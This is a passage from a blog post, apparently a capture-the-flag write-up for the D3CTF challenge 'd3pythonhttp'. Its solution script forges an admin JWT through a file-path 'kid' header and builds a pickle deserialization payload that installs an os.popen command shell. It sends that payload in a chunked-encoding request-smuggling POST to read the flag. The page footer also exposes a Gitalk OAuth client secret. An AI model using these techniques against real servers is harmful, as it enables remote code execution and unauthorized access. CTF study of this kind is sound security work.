+<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="comment"># host = &quot;39.105.51.11:28140&quot;</span></span><br><span class="line">host = <span class="string">&quot;139.224.222.124:30782&quot;</span></span><br><span class="line">url = <span class="string">f&quot;http://<span class="subst">&#123;host&#125;</span>/&quot;</span></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">command = <span class="string">&quot;cat Secr3T_Flag;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#####################1，伪造token</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>(<span class="params">kid</span>):</span><br><span class="line">    key = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">dir</span> = <span class="string">&quot;/app/&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="built_in">dir</span>+kid, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            key = f.read()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(key)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_token</span>(<span class="params">token</span>):</span><br><span class="line">    header = jwt.get_unverified_header(token)</span><br><span class="line">    kid = header[<span class="string">&quot;kid&quot;</span>]</span><br><span class="line">    key = get_key(kid)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = jwt.decode(token, key, algorithms=[<span class="string">&quot;HS256&quot;</span>])</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">user_info = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;isadmin&quot;</span>:<span class="literal">True</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;kid&quot;</span>:<span class="string">&quot;a.py&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">key = get_key(<span class="string">&quot;a.py&quot;</span>)</span><br><span class="line">token = jwt.encode(user_info,key,algorithm=<span class="string">&quot;HS256&quot;</span>,headers=headers).decode()</span><br><span class="line"><span class="built_in">print</span>(token,</span><br><span class="line">      verify_token(token),</span><br><span class="line">      jwt.decode(token, algorithms=[<span class="string">&#x27;HS256&#x27;</span>], options=&#123;<span class="string">&quot;verify_signature&quot;</span>: <span class="literal">False</span>&#125;)[<span class="string">&#x27;isadmin&#x27;</span>]</span><br><span class="line">      )</span><br><span class="line"></span><br><span class="line"><span class="comment">#####################2.反序列化</span></span><br><span class="line">cmd = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def shell(self):</span></span><br><span class="line"><span class="string">    return __import__(&quot;os&quot;).popen(&quot;<span class="subst">&#123;command&#125;</span>&quot;).read()</span></span><br><span class="line"><span class="string">index.POST = shell</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(cmd,))</span><br><span class="line"></span><br><span class="line">exp = exp()</span><br><span class="line">payload = base64.b64encode(pickle.dumps(exp)).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#####################3.发送请求</span></span><br><span class="line"></span><br><span class="line">data = payload + <span class="string">&quot;BackdoorPasswordOnlyForAdmin&quot;</span></span><br><span class="line">raw = <span class="string">f&quot;&quot;&quot;POST http://<span class="subst">&#123;host&#125;</span>/admin HTTP/1.1</span></span><br><span class="line"><span class="string">Host: <span class="subst">&#123;host&#125;</span></span></span><br><span class="line"><span class="string">User-Agent: python</span></span><br><span class="line"><span class="string">Transfer-Encoding: chunKED</span></span><br><span class="line"><span class="string">Cookie: token=<span class="subst">&#123;token&#125;</span></span></span><br><span class="line"><span class="string">Content-Length: <span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="subst">&#123;<span class="built_in">hex</span>(<span class="built_in">len</span>(data))[<span class="number">2</span>:]&#125;</span></span></span><br><span class="line"><span class="string"><span class="subst">&#123;data&#125;</span></span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;\r\n&quot;</span>).encode()</span><br><span class="line">conn = remote(host.split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>],<span class="built_in">int</span>(host.split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>]),ssl=<span class="literal">False</span>)</span><br><span class="line">conn.send(raw)</span><br><span class="line">res = conn.recvall()</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line">conn.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#####################4.查看回显</span></span><br><span class="line">res = requests.post(url=url+<span class="string">&quot;backend&quot;</span>).text</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/47D3CTF_d3pythonhttp/image-20240430121059398.png" alt="image-20240430121059398"></p>
+
+            </div>
+
+            
+
+            
+
+            
+                <div class="article-nav">
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2024/05/04/46Java_%E5%87%A0%E9%81%93%E9%A2%98%E7%9B%AE/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Java_Java赛题分析</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+                <div class="comment-container">
+                    
+<div class="comments-container">
+    <div id="comments-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments"></i>&nbsp;Comments
+    </div>
+    
+        
+            
+
+    <div class="gitalk-comment-container">
+        <div id="gitalk-container"></div>
+        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk/dist/gitalk.css">
+        <script  src="//cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js"></script>
+        <script >
+          function loadGitalk() {
+            let __gitalk__pathname = decodeURI(location.pathname);
+            const __gitalk__pathnameLength = __gitalk__pathname.length;
+            const __gitalk__pathnameMaxLength = 50;
+            if (__gitalk__pathnameLength > __gitalk__pathnameMaxLength) {
+              __gitalk__pathname = __gitalk__pathname.substring(0, __gitalk__pathnameMaxLength - 3) + '...';
+            }
+
+            try {
+              Gitalk && new Gitalk({
+                clientID: 'a415960e8a19902e98bf',
+                clientSecret: '97151a67ce9c95ad3c333c402f4cee0f5f05020f',
+                repo: 'gitalk',
+                owner: 'Lejeremiah',
+                admin: 'Lejeremiah',
+                id: __gitalk__pathname,
+                language: 'en'
+              }).render('gitalk-container');
+            } catch (e) {
+              window.Gitalk = null;
+            }
+          }
+
+          if ('false' === 'true') {
+            const loadGitalkTimeout = setTimeout(() => {
+              loadGitalk();
+              clearTimeout(loadGitalkTimeout);
+            }, 1000);
+          } else {
+            window.addEventListener('DOMContentLoaded', loadGitalk);
+          }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#d3pythonhttp"><span class="nav-text">d3pythonhttp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#d3%E5%8F%82%E8%80%83"><span class="nav-text">d3参考</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE"><span class="nav-text">题目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3"><span class="nav-text">题解</span></a></li></ol></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2020</span> -
+            
+            2024
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">jerem1ah</a>
+            
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.5.2</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+
+
+
+
+    
+<script src="/js/code-block.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/post-helper.js"></script>
+
+        
+            
+<script src="/js/libs/anime.min.js"></script>
+
+        
+        
+            
+<script src="/js/toc.js"></script>
+
+        
+    
+</div>
+
+
+
+</body>
+</html>
